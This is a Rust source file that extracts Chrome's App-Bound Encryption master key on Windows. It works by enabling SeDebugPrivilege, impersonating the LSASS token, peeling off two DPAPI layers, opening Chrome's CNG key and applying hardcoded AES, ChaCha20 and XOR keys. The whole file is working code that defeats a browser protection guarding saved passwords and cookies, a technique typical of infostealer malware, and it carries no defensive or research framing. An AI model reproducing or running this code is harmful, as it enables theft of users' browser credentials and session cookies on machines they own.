//! Chrome App-Bound Encryption (ABE) master key retrieval for Chrome 127+ v20 blobs.
//! Uses DPAPI layers, LSASS impersonation, and CNG for flag-3 keys (Windows).

use std::io::{Cursor, Read};
use std::path::Path;

const AES_KEY_FLAG1: [u8; 32] = [
    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66,
    0x51, 0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28,
    0x47, 0x87,
];
const CHACHA_KEY_FLAG2: [u8; 32] = [
    0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80,
    0x42, 0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72,
    0x96, 0x60,
];
const XOR_KEY_FLAG3: [u8; 32] = [
    0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06,
    0x1C, 0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39,
    0x23, 0x90,
];

struct ParsedKeyBlob {
    flag: u8,
    iv: [u8; 12],
    ciphertext: [u8; 32],
    tag: [u8; 16],
    encrypted_aes_key: Option<[u8; 32]>,
}

#[cfg(target_os = "windows")]
pub fn chrome_uses_v20() -> bool {
    chrome_local_state_path()
        .and_then(|path| std::fs::read_to_string(path).ok())
        .and_then(|content| serde_json::from_str::<serde_json::Value>(&content).ok())
        .and_then(|json| {
            json.pointer("/os_crypt/app_bound_encrypted_key")
                .and_then(|v| v.as_str())
                .map(|s| !s.is_empty())
        })
        .unwrap_or(false)
}

#[cfg(not(target_os = "windows"))]
pub fn chrome_uses_v20() -> bool {
    false
}

#[cfg(target_os = "windows")]
pub fn extract_app_bound_master_key(local_state_path: &Path) -> Option<Vec<u8>> {
    let content = std::fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json
        .pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64,
    )
    .ok()?;

    const APPB: &[u8] = b"APPB";
    if encrypted_key.len() <= APPB.len() || &encrypted_key[..APPB.len()] != APPB {
        return None;
    }

    let blob = &encrypted_key[APPB.len()..];
    let system_blob = impersonate_lsass(|| dpapi_unprotect(blob)).ok()?;
    let user_blob = dpapi_unprotect(&system_blob).ok()?;
    let parsed = parse_key_blob(&user_blob).ok()?;
    derive_v20_master_key(&parsed).ok()
}

#[cfg(not(target_os = "windows"))]
pub fn extract_app_bound_master_key(_local_state_path: &Path) -> Option<Vec<u8>> {
    None
}

#[cfg(target_os = "windows")]
pub fn chrome_local_state_path() -> Option<std::path::PathBuf> {
    let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
    let path = std::path::PathBuf::from(local_app_data)
        .join("Google")
        .join("Chrome")
        .join("User Data")
        .join("Local State");
    path.is_file().then_some(path)
}

fn parse_key_blob(blob_data: &[u8]) -> Result<ParsedKeyBlob, String> {
    let mut cursor = Cursor::new(blob_data);
    let mut header_len_bytes = [0u8; 4];
    cursor
        .read_exact(&mut header_len_bytes)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    let header_len = u32::from_le_bytes(header_len_bytes) as u64;

    let mut header = vec![0u8; header_len as usize];
    cursor
        .read_exact(&mut header)
        .map_err(|e| format!("Error was occurred: {e}"))?;

    let mut content_len_bytes = [0u8; 4];
    cursor
        .read_exact(&mut content_len_bytes)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    let content_len = u32::from_le_bytes(content_len_bytes) as u64;

    if header_len + content_len + 8 != blob_data.len() as u64 {
        return Err("Not Allowed".to_string());
    }

    let mut flag_bytes = [0u8; 1];
    cursor
        .read_exact(&mut flag_bytes)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    let flag = flag_bytes[0];

    let mut read_fixed =
        |size: usize| -> Result<Vec<u8>, String> { read_bytes(&mut cursor, size) };

    match flag {
        1 | 2 => {
            let iv = read_fixed(12)?.try_into().map_err(|_| "Invalid IV".to_string())?;
            let ciphertext = read_fixed(32)?
                .try_into()
                .map_err(|_| "Invalid ciphertext".to_string())?;
            let tag = read_fixed(16)?
                .try_into()
                .map_err(|_| "Invalid tag".to_string())?;
            Ok(ParsedKeyBlob {
                flag,
                iv,
                ciphertext,
                tag,
                encrypted_aes_key: None,
            })
        }
        3 => {
            let encrypted_aes_key = read_fixed(32)?
                .try_into()
                .map_err(|_| "Not Allowed".to_string())?;
            let iv = read_fixed(12)?.try_into().map_err(|_| "Invalid IV".to_string())?;
            let ciphertext = read_fixed(32)?
                .try_into()
                .map_err(|_| "Invalid ciphertext".to_string())?;
            let tag = read_fixed(16)?
                .try_into()
                .map_err(|_| "Invalid tag".to_string())?;
            Ok(ParsedKeyBlob {
                flag,
                iv,
                ciphertext,
                tag,
                encrypted_aes_key: Some(encrypted_aes_key),
            })
        }
        other => Err(format!("Not Allowed: {other}")),
    }
}

fn read_bytes(cursor: &mut Cursor<&[u8]>, size: usize) -> Result<Vec<u8>, String> {
    let mut buf = vec![0u8; size];
    cursor
        .read_exact(&mut buf)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    Ok(buf)
}

#[cfg(target_os = "windows")]
fn derive_v20_master_key(parsed: &ParsedKeyBlob) -> Result<Vec<u8>, String> {
    match parsed.flag {
        1 => aes_gcm_decrypt(&AES_KEY_FLAG1, &parsed.iv, &parsed.ciphertext, &parsed.tag),
        2 => chacha_decrypt(&CHACHA_KEY_FLAG2, &parsed.iv, &parsed.ciphertext, &parsed.tag),
        3 => {
            let encrypted_aes_key = parsed
                .encrypted_aes_key
                .ok_or_else(|| "Not Allowed".to_string())?;
            let decrypted_aes_key =
                impersonate_lsass(|| decrypt_with_cng(&encrypted_aes_key))?;
            if decrypted_aes_key.len() < 32 {
                return Err(format!(
                    "Not Allowed: {}, Unexpected value",
                    decrypted_aes_key.len()
                ));
            }
            let xored_aes_key: Vec<u8> = decrypted_aes_key[..32]
                .iter()
                .zip(XOR_KEY_FLAG3.iter())
                .map(|(a, b)| a ^ b)
                .collect();
            let key: [u8; 32] = xored_aes_key
                .try_into()
                .map_err(|_| "Not Allowed".to_string())?;
            aes_gcm_decrypt(&key, &parsed.iv, &parsed.ciphertext, &parsed.tag)
        }
        other => Err(format!("Not Allowed: {other}")),
    }
}

#[cfg(not(target_os = "windows"))]
fn derive_v20_master_key(_parsed: &ParsedKeyBlob) -> Result<Vec<u8>, String> {
    Err("Not Allowed".to_string())
}

fn aes_gcm_decrypt(
    key: &[u8; 32],
    iv: &[u8; 12],
    ciphertext: &[u8; 32],
    tag: &[u8; 16],
) -> Result<Vec<u8>, String> {
    use aes_gcm::aead::{Aead, KeyInit, Payload};
    use aes_gcm::{Aes256Gcm, Nonce};

    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| format!("Invalid: {e}"))?;
    let mut encrypted = ciphertext.to_vec();
    encrypted.extend_from_slice(tag);
    cipher
        .decrypt(Nonce::from_slice(iv), Payload { msg: &encrypted, aad: b"" })
        .map_err(|e| format!("Error was occurred: {e}"))
}

fn chacha_decrypt(
    key: &[u8; 32],
    iv: &[u8; 12],
    ciphertext: &[u8; 32],
    tag: &[u8; 16],
) -> Result<Vec<u8>, String> {
    use chacha20poly1305::aead::{Aead, KeyInit, Payload};
    use chacha20poly1305::ChaCha20Poly1305;

    let cipher =
        ChaCha20Poly1305::new_from_slice(key).map_err(|e| format!("Not Allowed: {e}"))?;
    let mut encrypted = ciphertext.to_vec();
    encrypted.extend_from_slice(tag);
    cipher
        .decrypt(iv.into(), Payload { msg: &encrypted, aad: b"" })
        .map_err(|e| format!("Error was occurred: {e}"))
}

#[cfg(target_os = "windows")]
fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use windows::Win32::Foundation::{LocalFree, HLOCAL};
    use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        if output.pbData.is_null() || output.cbData == 0 {
            return Err("Error was occurred:".to_string());
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        let _ = LocalFree(Some(HLOCAL(output.pbData as _)));
        Ok(result)
    }
}

#[cfg(target_os = "windows")]
const NCRYPT_SILENT_FLAG: u32 = 0x40;

#[cfg(target_os = "windows")]
fn decrypt_with_cng(input_data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ffi::c_void;
    use std::ptr;
    use windows::core::PCWSTR;

    #[link(name = "ncrypt")]
    extern "system" {
        fn NCryptOpenStorageProvider(
            ph_provider: *mut *mut c_void,
            psz_provider_name: PCWSTR,
            dw_flags: u32,
        ) -> i32;
        fn NCryptOpenKey(
            h_provider: *mut c_void,
            ph_key: *mut *mut c_void,
            psz_key_name: PCWSTR,
            dw_legacy_key_spec: u32,
            dw_flags: u32,
        ) -> i32;
        fn NCryptDecrypt(
            h_key: *mut c_void,
            pb_input: *const u8,
            cb_input: u32,
            p_padding_info: *const c_void,
            pb_output: *mut u8,
            cb_output: u32,
            pcb_result: *mut u32,
            dw_flags: u32,
        ) -> i32;
        fn NCryptFreeObject(h_object: *mut c_void) -> i32;
    }

    unsafe {
        let mut h_provider: *mut c_void = ptr::null_mut();
        let status = NCryptOpenStorageProvider(
            &mut h_provider,
            windows::core::w!("Microsoft Software Key Storage Provider"),
            0,
        );
        if status != 0 {
            return Err(format!(
                "Error was occurred: 0x{status:08X}"
            ));
        }

        let mut h_key: *mut c_void = ptr::null_mut();
        let status = NCryptOpenKey(h_provider, &mut h_key, windows::core::w!("Google Chromekey1"), 0, 0);
        if status != 0 {
            NCryptFreeObject(h_provider);
            return Err(format!("Error was occurred: 0x{status:08X}"));
        }

        let mut output_size = 0u32;
        let status = NCryptDecrypt(
            h_key,
            input_data.as_ptr(),
            input_data.len() as u32,
            ptr::null(),
            ptr::null_mut(),
            0,
            &mut output_size,
            NCRYPT_SILENT_FLAG,
        );
        if status != 0 {
            NCryptFreeObject(h_key);
            NCryptFreeObject(h_provider);
            return Err(format!("Error was occurred: 0x{status:08X}"));
        }

        let mut output = vec![0u8; output_size as usize];
        let status = NCryptDecrypt(
            h_key,
            input_data.as_ptr(),
            input_data.len() as u32,
            ptr::null(),
            output.as_mut_ptr(),
            output_size,
            &mut output_size,
            NCRYPT_SILENT_FLAG,
        );
        NCryptFreeObject(h_key);
        NCryptFreeObject(h_provider);
        if status != 0 {
            return Err(format!("Error was occurred: 0x{status:08X}"));
        }

        output.truncate(output_size as usize);
        Ok(output)
    }
}

#[cfg(target_os = "windows")]
fn impersonate_lsass<T, F>(f: F) -> Result<T, String>
where
    F: FnOnce() -> Result<T, String>,
{
    use std::mem::size_of;
    use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
    use windows::Win32::Security::{
        AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, LookupPrivilegeValueW,
        RevertToSelf, SecurityImpersonation, TokenImpersonation, LUID_AND_ATTRIBUTES,
        SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
        TOKEN_PRIVILEGES, TOKEN_QUERY,
    };
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use windows::Win32::System::Threading::{
        GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    unsafe {
        let mut current_token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut current_token)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        let mut luid = LUID::default();
        LookupPrivilegeValueW(None, windows::core::w!("SeDebugPrivilege"), &mut luid)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        AdjustTokenPrivileges(current_token, false, Some(&mut tp), 0, None, None)
            .map_err(|e| format!("Error was occurred: {e}"))?;
        let _ = CloseHandle(current_token);

        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        let mut entry = PROCESSENTRY32W {
            dwSize: size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let mut lsass_pid = None;
        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = entry.szExeFile;
                let len = name.iter().position(|&c| c == 0).unwrap_or(name.len());
                let exe = String::from_utf16_lossy(&name[..len]);
                if exe.eq_ignore_ascii_case("lsass.exe") {
                    lsass_pid = Some(entry.th32ProcessID);
                    break;
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);

        let lsass_pid = lsass_pid.ok_or_else(|| "lsass.exe not found".to_string())?;
        let lsass_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, lsass_pid)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        let mut lsass_token = HANDLE::default();
        OpenProcessToken(lsass_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut lsass_token)
            .map_err(|e| format!("Error was occurred: {e}"))?;
        let _ = CloseHandle(lsass_process);

        let mut impersonation_token = HANDLE::default();
        DuplicateTokenEx(
            lsass_token,
            TOKEN_IMPERSONATE | TOKEN_QUERY,
            None,
            SecurityImpersonation,
            TokenImpersonation,
            &mut impersonation_token,
        )
        .map_err(|e| format!("Error was occurred: {e}"))?;
        let _ = CloseHandle(lsass_token);

        ImpersonateLoggedOnUser(impersonation_token)
            .map_err(|e| format!("Error was occurred: {e}"))?;
        let _ = CloseHandle(impersonation_token);

        let result = f();
        let _ = RevertToSelf();
        result
    }
}
